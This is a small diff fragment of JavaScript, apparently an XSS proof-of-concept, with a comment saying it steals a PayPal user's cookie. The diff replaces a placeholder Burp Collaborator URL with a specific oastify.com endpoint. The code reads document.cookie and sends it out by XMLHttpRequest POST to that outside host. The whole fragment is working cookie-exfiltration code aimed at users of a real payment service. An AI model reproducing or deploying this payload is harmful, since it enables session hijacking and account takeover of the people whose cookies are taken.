@@ -7,7 +7,7 @@
         // Steal the PayPal user's cookie
         const cookie = document.cookie;
         const xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://burp-collaborator.net/your-unique-id', true);
+        xhr.open('POST', 'http://fbu3fplmds18asjft2xiz5mz0q6hu6.oastify.com', true);
         xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
         xhr.send(`cookie=${cookie}`);
 
